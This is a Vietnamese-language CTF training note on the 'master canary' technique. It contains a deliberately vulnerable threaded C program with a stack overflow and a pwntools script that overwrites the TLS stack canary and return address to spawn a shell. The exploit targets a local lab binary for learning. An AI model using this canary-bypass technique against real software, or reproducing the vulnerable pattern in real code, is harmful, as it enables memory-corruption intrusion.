### Hiểu về pthread trong c:
Được sử dụng trong thư viện C sau:
```c
#include <pthread.h>
```
những function cơ bản:
```c
pthread thread1;

pthread_create(&thread1, NULL, (void *) thread_routine, NULL);

pthread_join(thread1, NULL); 
```
Code logic:

Low-level logic:
___
File: `mc_thread`
```c
┌──(kali㉿kali)-[~/training_PWN/master_canary]
└─$ checksec --file=mc_thread
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols   FORTIFY  Fortified       Fortifiable     FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   49 Symbols  No     0               2               mc_thread
```
Code: `mc_thread.c`
```c
// Name: mc_thread.c
// Compile: gcc -o mc_thread mc_thread.c -pthread -no-pie
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void giveshell() { execve("/bin/sh", 0, 0); }
void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

void read_bytes(char *buf, int size) {
  int i;

  for (i = 0; i < size; i++)
    if (read(0, buf + i*8, 8) < 8)
      return;
}

void thread_routine() {
  char buf[256];
  int size = 0;
  printf("Size: ");
  scanf("%d", &size);
  printf("Data: ");
  read_bytes(buf, size);
}

int main() {
  pthread_t thread_t;

  init();

  if (pthread_create(&thread_t, NULL, (void *)thread_routine, NULL) < 0) {
    perror("thread create error:");
    exit(0);
  }
  pthread_join(thread_t, 0);
  return 0;
}
```
* main thread: main()
* new thread: thread_routine(), read_bytes()

script.py:
````python
from pwn import *

libc = ELF("./libc.so.6", checksec=False)

context.binary = exe = ELF("./mc_thread", checksec=False)
context.log_level = "debug"

p = process(exe.path)

def GDB():
	gdb.attach(p, gdbscript='''
		br *main
		br *thread_routine
		br *read_bytes
		br *read_bytes + 57
		br *thread_routine + 134
		''')
GDB()

giveshell = p64(0x401256)
tls_canary = 0x7ffff7bff6c0 + 0x28 # 0x7ffff7bff6e8
buffer = 0x7ffff7bfedc0
offset = tls_canary - buffer # 0x928 : 2344
thread_rip_offset = 0x7ffff7bfeed8 - 0x7ffff7bfedc0 # 0x118: 280
thread_rip_offset /=  0x08
thread_rip_offset = int(thread_rip_offset)

size = b"2345"  # offset / 0x08
p.sendlineafter(b"Size: ", size)

# payload = b"A" * 8

p.recvuntil(b"Data: ")
for i in range(int(size)):
	if i == thread_rip_offset:
		p.send(giveshell) 
	else:
		p.send(b"A" * 8)
p.send(b"A" * 8)

print(f"thread_rip_offset: {thread_rip_offset}")
# for i in range(thread_rip_offset):
# 	if i == thread_rip_offset-0x16:
# 		p.send(b"\x00")
# 	elif i == thread_rip_offset:
# 		p.send(giveshell)
# 	else:
# 		p.send(b"A" * 8)

# for i in range(36):
# 	if i == 35:
# 		p.send(giveshell)
# 	elif i == 33:
# 		p.send(b"\x00")
# 	else:
# 		p.send(b"A" * 8)


p.interactive()
````
___ 
**Tài liệu:**

https://www.youtube.com/watch?v=ldJ8WGZVXZk

https://unix.stackexchange.com/questions/528424/are-stack-canaries-shared-via-threads

**Notes:**
Thread Control Block (TCB):
```
Hoạt động ở tầng kernel, và quản lý thông tin các threads 
```
Thread Local Storage (TLS):
```
Vùng nhớ riêng biệt cho mỗi thread
```
